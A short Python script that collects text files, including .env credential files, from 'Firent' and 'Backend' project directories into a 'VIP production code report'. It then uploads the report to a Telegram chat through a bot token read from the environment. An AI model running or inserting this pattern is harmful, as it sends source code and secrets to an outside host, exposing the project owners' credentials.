import os, sys, datetime, requests

OUTPUT_FILE = "production_report.txt"
TEXT_EXTS = {".py", ".txt", ".yml", ".yaml", ".md", ".json", ".css", ".js", ".sh", ".env", ".sql", ".xml"}
SKIP_DIRS = {".git", "__pycache__", "node_modules", ".venv", "venv", "dist", "build"}
files = []

for repo in ["Firent", "Backend"]:
    if os.path.isdir(repo):
        for root, dirs, fs in os.walk(repo):
            dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
            for f in fs:
                p = os.path.join(root, f)
                if os.path.splitext(p)[1].lower() in TEXT_EXTS: files.append((p,p))

with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
    f.write("╔══════════════════════════════════════════════════════════╗\n")
    f.write("║       👑 VIP PRODUCTION CODE REPORT 👑                   ║\n")
    f.write("╚══════════════════════════════════════════════════════════╝\n\n")
    f.write(f"Total Files: {len(files)}\n\n")
    for _, p in files:
        try:
            f.write(f"\n{'='*60}\n📄 FILE: {p}\n{'='*60}\n")
            f.write(open(p, "r", encoding="utf-8", errors="ignore").read())
        except: pass

t = os.environ.get("BOT_TOKEN")
c = os.environ.get("CHAT_ID")
if t and c:
    requests.post(f"https://api.telegram.org/bot{t}/sendDocument", data={"chat_id": c, "caption": "VIP Report"}, files={"document": open(OUTPUT_FILE, "rb")})
